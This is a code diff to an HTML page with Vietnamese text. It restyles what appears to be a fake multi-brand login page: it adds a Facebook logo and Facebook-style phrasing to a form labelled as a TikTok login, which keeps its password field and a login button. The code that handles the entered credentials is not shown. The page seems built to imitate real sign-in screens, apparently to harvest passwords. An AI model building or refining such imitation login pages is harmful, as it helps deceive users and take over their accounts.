@@ -115,6 +115,11 @@
         .create-account-container.active {
             display: block;
         }
+        .tiktok-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 20px;
+        }
         input.form-control {
             margin-bottom: 10px;
             border-radius: 6px;
@@ -198,7 +203,7 @@
             margin-bottom: 8px;
         }
         .success-popup-message {
-            font-size: 12px; /* Chữ nhỏ hơn */
+            font-size: 12px;
             color: #4b4f56;
             margin-bottom: 15px;
         }
@@ -326,11 +331,11 @@
         </div>
         <!-- TikTok Login Container -->
         <div class="login-container-tiktok">
-            <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số điện thoại/Email/Tên người dùng">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="tiktok-logo">
+            <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
             <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
             <button class="btn btn-primary" onclick="login('tiktok')">Đăng nhập</button>
             <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
-            <div class="divider"></div>
             <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
         </div>
         <!-- Desktop Login Container -->
